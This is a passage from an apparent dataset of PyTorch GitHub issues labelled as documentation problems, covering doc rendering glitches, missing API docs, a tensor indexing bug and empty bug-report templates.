1.0.0a0\r\nIs debug build: No\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Ubuntu 18.04.1 LTS\r\nGCC version: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0\r\nCMake version: version 3.12.2\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy (1.15.4)\r\n[pip] torch (1.0.0a0, /app/pytorch)\r\n[conda] Could not collect\r\n"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIn the docs, a keyword parameter with default value of zero looks like a lowercase letter o. For example in [torch.util.data](https://pytorch.org/docs/stable/data.html#torch.utils.data.DataLoader), this is what the definition for dataloader looks like for me.\r\n\r\n![image](https://user-images.githubusercontent.com/10179936/49699847-57392e00-fbce-11e8-810b-0622ff8966b1.png)\r\n\r\n![image](https://user-images.githubusercontent.com/10179936/49699860-8bacea00-fbce-11e8-8dcd-4b84a0416350.png)\r\n\r\nZero looks fine in the docs for parameters themselves.\r\n\r\n![image](https://user-images.githubusercontent.com/10179936/49699870-a1baaa80-fbce-11e8-97f4-5402addffbce.png)\r\n\r\nPart of the issue is that numbers are smaller than usual."},{"labels":["documentation",null],"text":"C10 seems to have an increasingly important role throughout the PyTorch code base (e.g., see #6325 or count the number of open issues containing \"c10\") yet I was unable to find a high-level description about it. There are only \"rumors\" to be found about C10, see for example [this post](https://discuss.pytorch.org/t/pytorch-and-caffe2-convergence/21713/4) at pytorch.org:\r\n> I read on github, that there is a new backend called C10 in progress which combines features and backends from ATen and Caffe2. This backend should be a more generic one which means that adding new tensor types and similar stuff will be easier (the actual discussion was about introducing complex tensors).\r\n\r\nSomeone else on [Reddit](https://www.reddit.com/r/MachineLearning/comments/8xurkp/n_tensorflow_190_is_out/e27ewhz/):\r\n> I'd never heard of C10 until you posted this, so caveat emptor, but from the few Google hits available it seems that the major motivations for C10 include:\r\n>\r\n> * Common Tensor ops for PyTorch and Caffe2 (only PyTorch uses ATen)\r\n> * Pluggable tensor ops/backend (maybe easing future AMD, TPU, etc support?)\r\n>\r\n> There's also talk of C10 helping integration of Complex tensor support for PyTorch, which helps give an idea of the level of abstraction they are shooting for.\r\n\r\nAt the minimum, please add a README to the pytorch/c10 directory briefly describing the project."},{"labels":["documentation",null],"text":"## üêõ Bug\r\nWhen I copied a tensor to part of another tensor, I found a problem when the tensor copied to is indexed by numpy array.\r\nI'm using Pytorch 0.4.1. It is installed by pip, and I'm using Mac OS High Sierra.\r\n Below is an example, which can be reproduced easily in python environment.\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n`a = torch.zeros((2,2,1))`\r\n`x = torch.ones((1,1))`\r\n`indices = np.array([0,1])`\r\n`a[0,indices].copy_(x)`\r\nAfter this, printing out 'a' will still give a tensor full of zeros.\r\n\r\nI also found that the same problem occured when indices are list. Below is another reproduction of the problem.\r\n`a = torch.zeros((2,2,1))`\r\n`x = torch.ones((1,1))`\r\n`indices = [0,1]`\r\n`a[0,indices].copy_(x)`"},{"labels":[null,null,"documentation",null,null,null],"text":"## üìö Documentation\r\n\r\n`torch.onnx.export` shows no documentation on the docs [page](https://pytorch.org/docs/master/onnx.html#functions), while it has documentation in the [source](https://github.com/pytorch/pytorch/blob/master/torch/onnx/utils.py). It would be useful to have the documentation on the docs page.\r\n"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nLong pages in the documentation such as the [documentation for the torch.nn module](https://pytorch.org/docs/master/nn.html) take a long time to render and become interactive. On my system in the page is unresponsive for several seconds while opening this page, which makes navigating around the documentation a bit painful.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Go to the [torch.nn](https://pytorch.org/docs/master/nn.html) docs page in Chrome, Safari or Firefox\r\n1. Try to scroll or interact with the page (eg. to go to docs for a specific class from the table of contents) a few seconds after load\r\n\r\nA Chrome trace shows the time is split between layout and scripting. A significant chunk of the scripting time is spent in KaTeX math rendering.\r\n\r\n<img width=\"314\" alt=\"chrome performance summary\" src=\"https://user-images.githubusercontent.com/2458/49345714-ad631a00-f680-11e8-9811-58a0ea0d886b.png\">\r\n\r\n## Expected behavior\r\n\r\nIdeally the page would be small enough that browsers can load it without becoming unresponsive for a significant amount of time.\r\n\r\n## Environment\r\n\r\nTested with Chrome 72 and Safari 12.0 on a late 2016 13\" MBP.\r\n\r\nMy knowledge of Sphinx is limited, but perhaps it would make sense to split up the documentation for some of the largest modules into a summary page listing the classes/methods/functions with brief descriptions and a details page with the full docs, eg. using [sphinx.ext.autosummary](http://www.sphinx-doc.org/en/master/usage/extensions/autosummary.html)?\r\n\r\nIt probably would be possible to optimize the math rendering step without changing the structure, but as long as the page has as many DOM elements as this one, everything is likely to be sluggish."},{"labels":["documentation"],"text":"## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1.\r\n1.\r\n1.\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0):\r\n - OS (e.g., Linux):\r\n - How you installed PyTorch (`conda`, `pip`, source):\r\n - Build command you used (if compiling from source):\r\n - Python version:\r\n - CUDA/cuDNN version:\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":["documentation"],"text":"## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1.\r\n1.\r\n1.\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0):\r\n - OS (e.g., Linux):\r\n - How you installed PyTorch (`conda`, `pip`, source):\r\n - Build command you used (if compiling from source):\r\n - Python version:\r\n - CUDA/cuDNN version:\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":["documentation"],"text":"https://pytorch.org/docs/master/torch.html?highlight=full#torch.full_like :\r\n\r\n```Returns a tensor with the same size as input filled with fill_value. torch.full_like(input, fill_value) is equivalent to torch.full_like(input.size(), fill_value, dtype=input.dtype, layout=input.layout, device=input.device).```\r\n\r\nShould it not be `equivalent to torch.full(...`?"},{"labels":["documentation",null],"text":"## üìö Documentation\r\nThere are no code examples for `torch.nn.AdaptiveLogSoftmaxWithLoss`, and so it is not trivial how to go about using it as a layer, and how to use the methods `predict` and `log_prob`.\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation"],"text":"For the record it is ms but I have to sit down and ask myself this once every few weeks.\r\nhttps://pytorch.org/docs/master/cuda.html?highlight=cuda%20event#torch.cuda.Event"}]